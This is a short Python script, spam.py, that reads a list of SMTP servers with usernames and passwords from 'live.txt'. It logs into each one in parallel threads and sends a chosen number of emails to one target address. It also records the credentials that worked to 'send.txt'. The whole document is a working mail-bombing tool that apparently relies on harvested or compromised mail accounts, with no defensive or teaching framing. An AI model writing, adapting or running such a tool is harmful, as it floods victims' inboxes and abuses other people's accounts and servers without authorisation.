import sys
import smtplib
import threading

if len(sys.argv) != 3:
    print('Usage: python3 spam.py <receiver_mail> <repeat_per_server>')
    sys.exit(1)

receiver_mail = sys.argv[1]
repeat_per_server = int(sys.argv[2])

with open('live.txt', 'r') as file:
    servers = file.readlines()

def send_email(mail_host, mail_port, mail_user, mail_pass):
    try:
        smtp_server = smtplib.SMTP(mail_host, int(mail_port))
        smtp_server.starttls()
        smtp_server.login(mail_user, mail_pass)

        for _ in range(repeat_per_server):
            subject = 'Subject: Test'
            body = '@az369za (https://github.com/hoaan1995).'
            smtp_server.sendmail(mail_user, receiver_mail, f'{subject}\n\n{body}')

        smtp_server.quit()

        with open('send.txt', 'a') as send_file:
            send_file.write(f'{mail_host}:{mail_port}:{mail_user}:{mail_pass}\n')

        print(f'Successfully sent emails using {mail_host}:{mail_port}')
    except Exception as e:
        print(f'Failed to send emails using {mail_host}:{mail_port}. Error: {str(e)}')

for server in servers:
    mail_host, mail_port, mail_user, mail_pass = server.strip().split(':')
    thread = threading.Thread(target=send_email, args=(mail_host, mail_port, mail_user, mail_pass))
    thread.start()
